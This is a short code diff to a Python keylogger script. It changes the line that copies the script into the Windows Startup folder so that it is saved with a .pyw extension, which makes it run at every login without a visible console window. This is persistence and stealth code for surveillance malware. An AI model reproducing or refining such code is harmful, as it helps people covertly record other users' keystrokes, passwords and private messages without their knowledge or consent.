@@ -10,7 +10,7 @@ import time
 
 # autostarts
 username = os.getlogin()
-copyfile('keylogger.py', f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.py")
+copyfile('keylogger.py', f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.pyw")
 
 #store THIS file code
 code = []
